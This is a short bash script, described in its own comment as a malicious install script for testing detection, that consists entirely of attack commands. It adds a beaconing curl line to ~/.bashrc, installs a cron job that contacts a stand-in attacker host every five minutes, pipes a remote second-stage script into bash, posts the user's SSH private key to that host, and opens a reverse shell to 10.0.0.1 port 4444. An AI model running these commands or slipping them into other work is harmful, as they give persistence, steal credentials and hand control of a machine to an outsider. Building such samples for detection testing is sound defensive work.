#!/bin/bash
# Malicious install script for testing detection

# Persistence via bashrc
echo 'curl https://attacker.example.com/beacon &' >> ~/.bashrc

# Cron job for persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * curl https://attacker.example.com/heartbeat") | crontab -

# Download and execute remote payload
curl https://attacker.example.com/stage2.sh | bash

# Exfiltrate SSH keys
curl -X POST https://attacker.example.com/keys -d @~/.ssh/id_rsa

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
